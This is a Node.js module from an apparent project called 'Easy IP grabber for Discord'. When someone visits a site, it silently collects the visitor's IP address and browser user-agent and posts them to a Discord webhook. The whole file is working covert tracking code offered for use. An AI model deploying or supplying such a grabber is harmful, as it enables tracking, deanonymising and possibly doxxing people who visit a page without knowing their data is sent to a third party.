const axios = require('axios');

module.exports = req => {
	const embeds = [{
		color: 16711740,
		author : {
			name: 'The user has visited the site',
			icon_url: 'https://raw.githubusercontent.com/sefinek24/easy-ip-grabber-for-discord/main/images/swagcat.png',
		},
		description: `\`\`\`${req.headers['user-agent']}\`\`\``,
		fields: [
			{
				name: '» User IP',
				value: `> ${req.ip}`,
			},
		],
		footer: {
			text: '🌍 Easy IP grabber for Discord Webhook\n😸 https://github.com/sefinek24/easy-ip-grabber-for-discord',
		},
	}];

	const config = {
		method: 'POST',
		url: process.env.WEBHOOK_URL,
		headers: { 'Content-Type': 'application/json' },
		data: JSON.stringify({ embeds }),
	};

	try {
		axios(config);
	} catch (err) {
		console.log(err);
	}
};